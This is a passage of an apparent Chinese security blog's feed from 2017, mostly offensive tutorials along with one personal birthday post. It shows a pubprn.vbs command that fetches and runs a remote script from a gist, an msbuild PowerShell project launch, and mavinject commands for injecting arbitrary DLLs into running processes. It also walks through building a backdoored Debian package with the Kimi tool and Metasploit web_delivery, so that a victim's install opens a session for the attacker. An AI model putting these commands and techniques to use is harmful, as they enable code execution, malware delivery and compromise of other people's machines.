src="http://ojg8j426f.bkt.clouddn.com/39504489-B900-4A5E-A465-421B7BE5481A.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="3-Acunetix-0day-RCE"><a href="#3-Acunetix-0day-RCE" class="headerlink" title="3. Acunetix 0day RCE    "></a>3.<span style="color: #008000;"> Acunetix 0day RCE    </span></h2><p><a href="https://github.com/dzonerzy/acunetix_0day" target="_blank" rel="noopener">https://github.com/dzonerzy/acunetix_0day</a><br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/D1E4F2240C9783477A37981453B6FBD8.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/B412B944CB0CBEA152AC2417120FB212.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/9E3BE0E31476927E33544C2CE5BF2112.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="4-Gmail-存在-XSS"><a href="#4-Gmail-存在-XSS" class="headerlink" title="4. Gmail 存在 XSS"></a>4. Gmail 存在<span style="color: #008000;"> XSS</span></h2><p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/9E9B8D1553C1D57C91B3A08DAEBD8445.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/A293B4D82E929433DE7BEA6AA2F10D71.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="5-中国互联网-安全领袖峰大会-—孙冰-PDF"><a href="#5-中国互联网-安全领袖峰大会-—孙冰-PDF" class="headerlink" title="5.中国互联网 安全领袖峰大会 —孙冰 PDF   "></a>5.<span style="color: #008000;">中国互联网 安全领袖峰大会 —孙冰 PDF   </span></h2><p> <a href="https://github.com/deepchem/deepchem-gui" target="_blank" rel="noopener">https://github.com/deepchem/deepchem-gui</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/85022A4F-8FA7-4DA6-A90A-BCDE3E718D83.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="6-Github蜜罐资源列表"><a href="#6-Github蜜罐资源列表" class="headerlink" title="6.Github蜜罐资源列表   "></a>6.<span style="color: #008000;">Github蜜罐资源列表   </span></h2><p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/63580377-3020-449B-9930-C7BC4295DCD2.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="7-针对说俄语的企业的恶意邮件活动是利用漏洞和Windows-office组件的组合来提供新的后门"><a href="#7-针对说俄语的企业的恶意邮件活动是利用漏洞和Windows-office组件的组合来提供新的后门" class="headerlink" title="7. 针对说俄语的企业的恶意邮件活动是利用漏洞和Windows office组件的组合来提供新的后门"></a>7. <span style="color: #008000;">针对说俄语的企业的恶意邮件活动是利用漏洞和Windows office组件的组合来提供新的后门</span></h2><p><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/" target="_blank" rel="noopener">http://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/52ABA646BD48089649F92485EC09A18F.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="8-恶意PAYLOAD"><a href="#8-恶意PAYLOAD" class="headerlink" title="8.恶意PAYLOAD "></a>8.<span style="color: #008000;">恶意PAYLOAD </span></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn<span class="selector-class">.vbs</span> localhost</span><br><span class="line">“script:https:<span class="comment">//gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f3</span></span><br><span class="line"><span class="number">21</span>ba07/raw/<span class="number">73</span>c962d65059a211b5d7ea212e9a1054d632622b/new.txt”</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/93B45FFD4A1AAFADA5C1C7DABCE3CD87.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="9-如何用C＃写注入一个DLL进程"><a href="#9-如何用C＃写注入一个DLL进程" class="headerlink" title="9. 如何用C＃写注入一个DLL进程"></a>9. <span style="color: #008000;">如何用</span><strong><span style="color: #008000;">C＃写注入一个DLL进程</span></strong></h2><p><a href="http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread" target="_blank" rel="noopener">http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/D8C6FAC0E2AFA5D0DB137D052ED28AB1.jpg" alt="enter description here"></p><h2 id="10-MSbuild-—–PowaShell-csproj-（具体poc文件-可进技术群-群文件中下载）"><a href="#10-MSbuild-—–PowaShell-csproj-（具体poc文件-可进技术群-群文件中下载）" class="headerlink" title="10. MSbuild —–PowaShell.csproj  （具体poc文件 可进技术群 群文件中下载）"></a>10. <strong><span style="color: #008000;">MSbuild —–PowaShell.csproj  （具体poc文件 可进技术群 群文件中下载）</span></strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\msbuild<span class="selector-class">.exe</span> test.csproj</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/BCFF9C401D2DE0E7B9B7E53F1836037E.jpg" alt="enter description here"></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/powaShellcsproj.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="11-TCP-bind-shell"><a href="#11-TCP-bind-shell" class="headerlink" title="11. TCP-bind shell"></a>11. <span style="color: #008000;">TCP-bind shell</span></h2><p><a href="https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/[enter" target="_blank" rel="noopener">https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/[enter</a> description here]<a href="https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/" target="_blank" rel="noopener">22</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/4B3B029A796E703D43E3E2AFA962D373.jpg" alt="enter description here"></p><p><span style="color: #008000;">欢迎进入   即刻安全技术交流 :307283889  每日都会分享最新最好的干货 </span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/82260D1294C5293BF83750DE949303D3.png&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="每日安全干货及动态" scheme="www.ggsec.cn/categories/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81/"/>
    
    
      <category term="每日安全干货及动态" scheme="www.ggsec.cn/tags/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>Tracker | Dll Injected</title>
    <link href="www.ggsec.cn/Tracker.html"/>
    <id>www.ggsec.cn/Tracker.html</id>
    <published>2017-12-21T12:03:18.000Z</published>
    <updated>2017-12-21T12:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/1513858216225.jpg" alt="enter description here"><br><a id="more"></a></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Tracker.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题·        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="前天在某推看到-在一年前（subtee）发现了"><a href="#前天在某推看到-在一年前（subtee）发现了" class="headerlink" title="前天在某推看到 在一年前（subtee）发现了"></a>前天在某推看到 在一年前（subtee）发现了</h2><p> <img src="http://ojg8j426f.bkt.clouddn.com/1513858917056.jpg" alt="enter description here"></p><p> <img src="http://ojg8j426f.bkt.clouddn.com/EF953652542BEACE168119915DDAF8E9.png" alt="enter description here"></p><p> &nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1513858991311.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1513859183063.jpg" alt="enter description here"><br>Tracker.exe用于启动一个进程，并在创建之后将FileTracker.dll注入到该进程中。跟踪目标进程的文件访问，并在进程退出之前写入.tlog文件。</p><p>但是，如果多个线程（具有相同的中间目录）并行地（通过Tracker.exe）并行启动同一目标可执行文件的多个实例，则所有这些进程将尝试写入同名的.tlog文件<em> </em>当他们退出。如果足够的进程并行运行，这种竞争条件不可避免地导致其中一个无法打开文件进行写入（因为另一个实例已经打开），导致错误FTK1011：</p><p>FileTracker：错误FTK1011：无法创建新文件跟踪日志文件：C：\ … \ tlogs \ ipconfig.read.1.tlog。该文件存在。</p><p>我在实际应用中观察到了这一点，并将其简化为一个简单的自包含的测试用例。只需运行它，并等待控制台中出现错误（可能需要两到三次尝试，但通常至少发生一次）。</p><p>请注意，Visual Studio设法通过巧合来避免这种竞争条件 - 在构建一个包含许多C ++文件的项目时，构建系统不是同时启动多个cl.exe实例，而是构建系统启动一个实例并将所有C ++文件（然后cl.exe使用多个线程并行编译）。<br>详细信息</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1513859321518.jpg" alt="enter description here"></p><h2 id="正好也是在这个月推主发推了"><a href="#正好也是在这个月推主发推了" class="headerlink" title="正好也是在这个月推主发推了"></a>正好也是在这个月推主发推了</h2><p><img src="http://ojg8j426f.bkt.clouddn.com/F5428F36171E976B3621F04D05BB2A89.png" alt="enter description here"></p><h2 id="自己也复现了一下"><a href="#自己也复现了一下" class="headerlink" title="自己也复现了一下"></a>自己也复现了一下</h2><p><img src="http://ojg8j426f.bkt.clouddn.com/1513859530284.jpg" alt="enter description here"></p><p>最后也是感谢两位  Yansu 、 V@1n3R. 给我的帮助，  最终一起能复现出这个bug。</p><p>我已打包上传到 GitHub 上了  <a href="https://github.com/demonsec666/Tracker" target="_blank" rel="noopener">https://github.com/demonsec666/Tracker</a></p><p><a href="https://connect.microsoft.com/VisualStudio/feedback/details/1655214/msbuild-tracker-exe-race-condition-when-called-in-parallel-for-instances-of-the-same-exe" target="_blank" rel="noopener">https://connect.microsoft.com/VisualStudio/feedback/details/1655214/msbuild-tracker-exe-race-condition-when-called-in-parallel-for-instances-of-the-same-exe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/1513858216225.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Mavinject | Dll Injected</title>
    <link href="www.ggsec.cn/mavinject.html"/>
    <id>www.ggsec.cn/mavinject.html</id>
    <published>2017-12-20T13:06:12.000Z</published>
    <updated>2018-01-20T23:59:35.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/14CCE2557B1CD2558BBFCA878F0EF92E.jpg" alt="enter description here"><br><a id="more"></a></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/mavinject.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>DLL注入<br>什么是DLL注入？DLL注入是将 DLL 注入进程的内存空间，然后将其作为其一部分执行的过程。这样做意味着DLL代码具有对进程内存的所有访问权限，无论出于何种原因都可以对其进行操作，但更重要的是，它还获得了进程的所有权限。例如，您希望与外界沟通，但您没有通过防火墙的权限。随着注入DLL，你可以注入并执行你的代码到其中的过程确实有权限（如Internet Explorer），这将是能够做什么它需要。</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1513775930135.jpg" alt="enter description here"><br>如果有人对如何编写一个基本的DLL注入器感兴趣，请让我知道下面。</p><p>用户模式Rootkit<br>用户模式rootkit是提供与内核模式rootkit类似功能的rootkit（尽管在技术上不是这样），例如屏蔽和禁止访问文件，但在用户级别操作。我们把这个级别称为ring 3，而内核模式rootkit是ring 0。这些戒指是什么？这是一个视觉辅助图。<br><img src="http://ojg8j426f.bkt.clouddn.com/1513775561212.jpg" alt="enter description here"></p><p>我们可以看到，绿色是用户模式，中间的红色是内核模式。尽管环1和环2确实存在，但实际上并不使用，所以我们只是指0或3。</p><p>从环3调用WinAPI函数调用，因为环3不能直接与CPU通信，所以必须通过一系列特权检查向内环0进行响铃。一旦进入响铃0，操作系统执行指令来执行函数调用所需的操作。通过这样做，API 相信从环3传递到0并返回的参数将保持其完整性而不被修改。</p><h2 id="mavinject"><a href="#mavinject" class="headerlink" title="mavinject"></a>mavinject</h2><p>Mavinject是一个合法的Windows组件，可以在任何正在运行的进程中使用和滥用，执行任意代码注入。由于这是Windows上的一个常见组件，因此可以利用它来执行无人区域的攻击。<br><img src="http://ojg8j426f.bkt.clouddn.com/1513778423174.jpg" alt="enter description here"></p><p>进一步分析后，我们被解雇的事件为假阳性，但我们仍然受到触发的原因，为什么一个合法的部分将执行这样的操作的原因感到困惑  EXCEL.EXE。<br><img src="http://ojg8j426f.bkt.clouddn.com/events-768x180.png" alt="enter description here"><br>在时间轴方面，mavinject32.exe在excel.exe中执行代码注入 ，然后立即终止。这引起了一些关于引擎操作可能带有恶意并且开始跟踪端点行为的担忧。以下是违规程序的细节：<br><img src="http://ojg8j426f.bkt.clouddn.com/proc-details-768x226.png" alt="enter description here"></p><p>现在很清楚，mavinject32.exe是一个合法的 Microsoft组件。命令行也很有趣，因为从初步分析来看，论据似乎如下：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavinject32.exe &lt;PID&gt; &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure></p><p>实际上是在端点上运行的excel.exe实例的PID，其路径与在“事件”期间注入的DLL 的路径相对应。“mav-inject”的名字应该已经相当透露了，在这一点上，我们怀疑它可能被用来（和滥用）在任何其他进程中注入任意的恶意DLL。</p><p>作为第一步，我们尝试了解Mavinject是否是共同的组件; 我们在以下位置的不同端点上找到它：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe"</span><br></pre></td></tr></table></figure></p><p>此外，可执行文件可以在其他两个目录中找到：System32和SysWOW64。</p><p>文件描述显示组件是什么：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileDescription:  Microsoft Application Virtualization Injector</span><br></pre></td></tr></table></figure></p><p>该应用程序是Microsoft Application Virtualization（App-V）的一部分。可执行文件的分析使我们得到以下有趣的参数<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/INJECTRUNNING</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1513776172973.jpg" alt="enter description here"></p><p>使用Mavinject …<br>在收集到来自不同客户的更多信息之后，我们确定了一个常见的用例：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavinject &lt;PID&gt; /INJECTRUNNING</span><br></pre></td></tr></table></figure></p><p>使用此命令行运行的可执行文件查找以下注册表项：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY<span class="emphasis">_LOCAL_</span>MACHINE\SOFTWARE\Microsoft\AppV\Subsystem</span><br></pre></td></tr></table></figure></p><p>其相应的值是：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ValueName: Modules - ValueData: C:\Windows\System32\AppVEntSubsystems32.dll</span><br><span class="line">ValueName: Modules64 - ValueData: C:\Windows\System32\AppVEntSubsystems64.dll</span><br></pre></td></tr></table></figure></p><p>根据目标进程体系结构（32位或64位），它会注入其中一个DLL。</p><p>虐待Mavinject …<br>经过进一步分析，很明显的是，同样的确切机制可以被滥用以下方式注入一个DLL在一个任意的运行过程中：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MavInject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/DRGMJzHVQAEZMxn.jpg" alt="enter description here"></p><p><img src="http://ojg8j426f.bkt.clouddn.com/DRGMovJWsAAMNDD.jpg" alt="enter description here"></p><p>参考资料 ：dll  <a href="https://gist.github.com/anonymous/b25cb82c4b3d40648f0b589fa242577f" target="_blank" rel="noopener">https://gist.github.com/anonymous/b25cb82c4b3d40648f0b589fa242577f</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/052530D337AEFC1DDEC731D041FF3608.jpg" alt="enter description here"><br><a href="https://reaqta.com/2017/12/mavinject-microsoft-injector/" target="_blank" rel="noopener">https://reaqta.com/2017/12/mavinject-microsoft-injector/</a>  从假阳性到真阳性：微软注射器Mavinject.exe的故事<br><a href="https://twitter.com/subTee/status/942779279623913473" target="_blank" rel="noopener">https://twitter.com/subTee/status/942779279623913473</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/14CCE2557B1CD2558BBFCA878F0EF92E.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-5123  |kali linux 2017</title>
    <link href="www.ggsec.cn/CVE-2017-5123.html"/>
    <id>www.ggsec.cn/CVE-2017-5123.html</id>
    <published>2017-11-02T11:32:58.000Z</published>
    <updated>2017-11-02T12:54:57.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/9D0AE11358E13264F56A74B6598CC5D1.jpg" alt="enter description here"><br><a id="more"></a><br>github :<br><a href="https://github.com/nongiach/CVE" target="_blank" rel="noopener">https://github.com/nongiach/CVE</a></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/CVE-2017-5123.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>如果出现<img src="http://ojg8j426f.bkt.clouddn.com/1509627258574.jpg" alt="enter description here"><br>那就:apt-get install qemu-system-x86</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/9D0AE11358E13264F56A74B6598CC5D1.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>祝自己生日快乐</title>
    <link href="www.ggsec.cn/happy-birthday.html"/>
    <id>www.ggsec.cn/happy-birthday.html</id>
    <published>2017-10-21T23:16:47.000Z</published>
    <updated>2017-10-21T23:41:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/1508628330668.jpg" alt="enter description here"><br><a id="more"></a></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=486403266&auto=1&height=66"></iframe><p>每年的今天似乎都是一个人过的生日，但是没想到的是今年却在病魔中渡过的。</p><p>自己依稀记得自己模模糊糊的接到了父亲的三次电话，都是在问我，：“儿子，病好点了吗”  “好点了。。。。”</p><p>昨晚也是收到母亲的安慰，那时候感觉真的是亲情的可贵，世界最温暖人心的还是亲情。当在病魔中挣扎的时候，</p><p>想起了很多年母亲带我看医生的时候，如今只有一个人看病。小时候有母亲给我买的玩具，却是安心的陪母亲上</p><p>医院。如今只有母亲和父亲的短短几句话，感觉真的人生足矣！那晚哭了 。十几年不落泪的我，居然哭了，哭的</p><p>很伤心。想问，时间去哪儿了。父母亲虽然老了，但是对我的爱却是永恒不变的。</p><p>怕自己老了，忘事。将其这美好的事情记录下来<br><img src="http://ojg8j426f.bkt.clouddn.com/59FD210598B5CA9B830E96E2CC6E927E.jpg" alt="enter description here"></p><h2 id="最后祝自己生日快乐！！！！"><a href="#最后祝自己生日快乐！！！！" class="headerlink" title="最后祝自己生日快乐！！！！"></a>最后祝自己生日快乐！！！！</h2><p></p><p><img src="http://ojg8j426f.bkt.clouddn.com/1508628364893.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/1508628330668.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux_inject_kimi | MSF | kali linux 2017</title>
    <link href="www.ggsec.cn/Linux-inject-kimi.html"/>
    <id>www.ggsec.cn/Linux-inject-kimi.html</id>
    <published>2017-10-15T03:15:21.000Z</published>
    <updated>2017-10-15T05:01:34.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/B46C191A74189731E83B64602C5CF707.png" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/Linux-inject-kimi.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Kimi的名字灵感来源于“Kimimaro”，是动画片“火影忍者”的动画片之一。</span><br><span class="line">Kimi是一个为metasploit生成恶意debian软件包的脚本</span><br><span class="line">它由bash文件组成。 bash文件被部署到“/usr/local /bin/”目录中。</span><br><span class="line">当受害者尝试安装deb包由于postinst文件时，后门被执行</span><br><span class="line">Bash文件注入，也像一些受害者执行时的系统命令</span><br><span class="line">攻击者与会话点击。</span><br><span class="line"><span class="bullet">- </span>完全独立 意味着用户不需要安装任何debian包创建者</span><br><span class="line"><span class="bullet">- </span>可以与任何有效载荷发生器集成，</span><br><span class="line">Kimi基本上取决于web_delivery模块，每件事情都是自动化的。</span><br><span class="line">所有的攻击者需要做以下设置：</span><br></pre></td></tr></table></figure><p><img src="http://ojg8j426f.bkt.clouddn.com/1508039936984.jpg" alt="enter description here"></p><pre>msf > use exploit/multi/script/web_deliverymsf exploit(web_delivery) > set srvhost 192.168.0.102srvhost => 192.168.0.102msf exploit(web_delivery) > set uripath /SecPatchuripath => /SecPatchmsf exploit(web_delivery) > set Lhost 192.168.0.102Lhost => 192.168.0.102msf exploit(web_delivery) > show optionsmsf exploit(web_delivery) > exploit</pre>github: https://github.com/ChaitanyaHaritash/kimi<p></p><strong><span style="color: #ff0000;">声明：本文内容仅供交流学习使用，一切由使用者造成的法律问题，均由使用者自行承担！本站及作者概不负责！</span></strong><p></p>制作这种过程也是很简单,先来简单的看下帮助参数<pre>  -h, --help         列举一些帮助参数  -n NAME,  -n  参数 后面需要跟上Deb包的名称  -l LHOST, --lhost （-l 参数 后面需要跟上本机的IP    地址）                        LHOST, for Handler  -V VERS,  （-V 参数跟上随意指定版本信息以区分之前的包）  -a ARCH, --arch ARCH  Architecture (i386/amd64) （-a 参数 需指定平台架构 如i386/amd64）</pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>那么我们来简单看下需要用的参数:<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041138026.jpg" alt="enter description here"><br>&nbsp;</p><p>1.首先需要一个Deb 包：我这里随便弄了个包 之前有在 <a href="http://www.ggsec.cn/Debinject.html">http://www.ggsec.cn/Debinject.html</a> 用到过。<br>我这里重命名为f。便于写。<img src="http://ojg8j426f.bkt.clouddn.com/1508041076595.jpg" alt="enter description here"><br>那么-n 的参数跟上 f （以包名称为准）</p><p>2.填上ip地址 -l 192.168.1.103<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041273641.jpg" alt="enter description here"><br>&nbsp;</p><p> 3.添加平台架构  -a amd64 (我这里是64位的 所以填写amd64，根据目标机情况填写 )<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041369868.jpg" alt="enter description here"></p><p>4.添加版本-V 参数跟上随意指定版本信息以区分之前的包 <img src="http://ojg8j426f.bkt.clouddn.com/1508041517597.jpg" alt="enter description here"></p><h2 id="生成并解压，得到会话"><a href="#生成并解压，得到会话" class="headerlink" title="生成并解压，得到会话"></a>生成并解压，得到会话</h2><p>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508041977046.jpg" alt="enter description here"><br>&nbsp;<br>生成了backdoor<img src="http://ojg8j426f.bkt.clouddn.com/1508042235136.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042297286.jpg" alt="enter description here"><br>&nbsp;</p><p>在此期间会开启虚拟终端（xterm）<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042427222.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/1508042205105.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042169268.jpg" alt="enter description here"><br>&nbsp;<br>这个是xterm<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042349332.jpg" alt="enter description here"></p><p>解压backdoor<br><img src="http://ojg8j426f.bkt.clouddn.com/1508042528761.jpg" alt="enter description here"></p><p>并且得到会话<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1508037428945.jpg" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/B46C191A74189731E83B64602C5CF707.png&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="www.ggsec.cn/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="www.ggsec.cn/tags/Metasploit/"/>
    
  </entry>
  
</feed>
